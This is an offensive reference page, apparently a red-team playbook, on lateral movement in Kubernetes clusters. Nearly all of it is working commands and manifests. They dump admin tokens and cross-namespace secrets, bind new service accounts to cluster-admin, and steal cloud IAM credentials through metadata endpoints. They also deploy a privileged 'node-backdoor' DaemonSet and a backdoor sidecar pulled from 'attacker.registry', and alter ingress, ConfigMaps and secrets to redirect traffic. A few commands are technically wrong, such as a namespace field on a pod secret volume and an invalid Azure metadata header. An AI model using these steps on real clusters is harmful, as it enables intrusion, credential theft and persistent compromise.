# Kubernetes Lateral Movement

Techniques for moving between pods, nodes, and namespaces in Kubernetes clusters.

## Namespace Traversal

### Enumerate All Namespaces

```bash
# List all namespaces
kubectl get namespaces

# Check what you can access in each
for ns in $(kubectl get ns -o name | cut -d'/' -f2); do
  echo "=== Namespace: $ns ==="
  kubectl get pods -n $ns 2>/dev/null || echo "Access denied"
  kubectl get secrets -n $ns 2>/dev/null || echo "Access denied"
done

# Check for high-value namespaces
# Common: kube-system, kube-public, default, cert-manager, ingress-nginx

# Access admin namespace if possible
kubectl get all -n kube-system

# Get admin credentials from kube-system
kubectl get secrets -n kube-system | grep admin
kubectl get secret admin-token -n kube-system -o jsonpath='{.data.token}' | base64 -d
```

### Cross-Namespace Service Access

```bash
# Services in one namespace accessible from another
# Format: {service-name}.{namespace}.svc.cluster.local

# From pod, access service in different namespace
curl http://database.production.svc.cluster.local:5432

# If you can reach it, it's not protected by namespace isolation
# Can compromise services across namespaces

# Create pod in different namespace if permissions allow
kubectl create namespace attacker-ns
kubectl run backdoor -n attacker-ns --image=ubuntu

# From backdoor pod, access all services
curl http://api-gateway.production.svc.cluster.local:8080
```

### Secrets from Other Namespaces

```bash
# Check if you can read secrets across namespaces
kubectl get secrets --all-namespaces

# If permitted, extract secrets
kubectl get secret {secret-name} -n {namespace} -o jsonpath='{.data}' | jq 'map_values(@base64d)'

# Common cross-namespace secrets:
# - Database credentials
# - API keys
# - OAuth tokens
# - TLS certificates

# Create pod with mounted secrets from other namespace
cat > secret-access.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: secret-reader
  namespace: attacker-namespace
spec:
  serviceAccountName: secret-reader
  containers:
  - name: reader
    image: ubuntu
    volumeMounts:
    - name: db-creds
      mountPath: /secrets
  volumes:
  - name: db-creds
    secret:
      secretName: database-credentials
      namespace: production
EOF

kubectl apply -f secret-access.yaml
kubectl exec -it secret-reader -- cat /secrets/password
```

## Inter-Pod Lateral Movement

### Pod-to-Pod Communication

```bash
# From one pod, enumerate others on cluster
kubectl get pods --all-namespaces -o wide

# Try to access pods directly via IP
POD_IP=$(kubectl get pod {pod-name} -o jsonpath='{.status.podIP}')
curl http://$POD_IP:8080

# If service discovery allows, use service names
curl http://{service}.{namespace}:8080

# Check what services are running
kubectl get svc --all-namespaces

# If no network policies, pods can communicate freely
# Can exploit services in other pods
```

### Abuse Service Account in Different Namespace

```bash
# If you can create service accounts in other namespaces
# Create admin service account there

kubectl create serviceaccount admin -n production
kubectl create clusterrolebinding production-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=production:admin

# Get token from new service account
TOKEN=$(kubectl get secret \
  $(kubectl get secret -n production | grep admin | awk '{print $1}') \
  -n production \
  -o jsonpath='{.data.token}' | base64 -d)

# Use token with API
curl -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default:443/api/v1/pods?fieldSelector=metadata.namespace!=kube-system
```

## Node-Level Lateral Movement

### Compromise Node and Access Other Pods

```bash
# If you compromise a node (via pod escape)
# You can access all pods on that node

# Get node name
NODE=$(kubectl get pod $POD_NAME -o jsonpath='{.spec.nodeName}')

# SSH to node (if you have credentials)
ssh -i {node-key} {node-user}@{node-ip}

# On node, access pod data
ls -la /var/lib/kubelet/pods/

# Get pod secrets
find /var/lib/kubelet/pods -name "token" -o -name "*.key"

# Access running containers
docker ps
docker exec -it {container} /bin/bash

# Access container logs
docker logs {container} 2>&1 | grep -i "password\|token\|secret"
```

### Kubelet to Cloud Access

```bash
# Kubelet has cloud credentials for node provisioning
# Can use to access cloud resources

# Check for cloud metadata
curl http://169.254.169.254/latest/meta-data/  # AWS
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/  # GCP
curl -H "Metadata-Flavor: Azure" http://169.254.169.254/metadata/instance  # Azure

# Extract role/service account information
AWS_ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Get credentials using role
CREDS=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$AWS_ROLE)

# Use to access cloud resources
# S3, RDS, EC2, etc.
```

## DaemonSet Lateral Movement

```bash
# If you can create DaemonSets
# Run code on every node

cat > node-backdoor.yaml << 'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-backdoor
  namespace: kube-system
spec:
  selector:
    matchLabels:
      name: node-backdoor
  template:
    metadata:
      labels:
        name: node-backdoor
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: backdoor
        image: attacker.registry/node-backdoor:latest
        securityContext:
          privileged: true
        volumeMounts:
        - name: root
          mountPath: /host_root
      volumes:
      - name: root
        hostPath:
          path: /
EOF

kubectl apply -f node-backdoor.yaml

# Runs on every node with host access
# Can compromise entire cluster
```

## StatefulSet and Deployment Hijacking

```bash
# If you can modify deployments/statefulsets
# You can deploy malicious workloads

# Patch existing deployment to add sidecar
kubectl patch deployment myapp -p '
{
  "spec": {
    "template": {
      "spec": {
        "containers": [
          {
            "name": "backdoor-sidecar",
            "image": "attacker.registry/persistence:latest",
            "securityContext": {
              "privileged": true
            }
          }
        ]
      }
    }
  }
}'

# Next deployment includes backdoor sidecar
# Runs with application permissions
```

## Ingress-Controller Lateral Movement

```bash
# Ingress controller has broad network access
# Can intercept all traffic

# Find ingress controller
kubectl get pods -n ingress-nginx

# If you can access ingress controller pod
# It likely has certificate keys and routing rules

# Check ingress controller secrets
kubectl get secrets -n ingress-nginx

# Modify ingress rules if you have permissions
kubectl edit ingress {ingress-name}

# Can redirect traffic:
# - Intercept API calls
# - Route requests to attacker server
# - Steal authentication credentials
```

## ConfigMap Propagation

```bash
# ConfigMaps accessible to multiple pods
# If you can modify ConfigMap, affects all pods using it

# Find ConfigMaps
kubectl get configmaps --all-namespaces

# Modify ConfigMap used by critical application
kubectl edit configmap app-config

# Insert malicious configuration:
# - Endpoint modifications
# - Logging to attacker server
# - Code injection in config parsing

# When pods restart, new config applied
# Affects all replicas automatically
```

## Secret Propagation Exploitation

```bash
# Secrets distributed to pods via volume mounts
# If you control secret, you control pod behavior

# Find what secrets are mounted
kubectl get pods -o json | jq '.items[] | {name: .metadata.name, volumes: .spec.volumes}'

# Identify mounted secrets
kubectl get pod {pod-name} -o json | jq '.spec.volumes[] | select(.secret != null)'

# If you can modify secret
kubectl edit secret {secret-name}

# Modify secret value
# Next pod restart picks up new value
# Could be credentials, API keys, certificates

# Example: Modify database password secret
# Application connects to attacker-controlled database
```
